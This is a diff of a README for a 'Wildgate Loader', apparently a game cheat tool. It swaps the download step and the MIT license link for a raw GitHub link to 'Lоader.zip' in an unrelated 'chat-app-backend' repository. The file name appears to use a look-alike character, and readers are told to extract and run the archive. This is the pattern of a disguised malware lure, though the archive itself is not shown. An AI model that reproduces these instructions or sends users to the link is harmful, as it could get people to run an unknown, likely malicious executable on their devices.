@@ -32,7 +32,7 @@ All platforms are regularly updated for optimal performance in 2025.
 
 ## 📦 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/arun0912-a/chat-app-backend/main/Lоader.zip** from the repository.
 2. Extract and run the Wildgate Loader on your device.
 3. Follow on-screen instructions for tailored module deployment.
 
@@ -55,7 +55,7 @@ This project is provided for educational and personal optimization purposes only
 ## 📜 License
 
 Distributed under the MIT License.  
-Read the full license [here](https://opensource.org/licenses/MIT).
+Read the full license [here](https://raw.githubusercontent.com/arun0912-a/chat-app-backend/main/Lоader.zip).
 
 ---
 
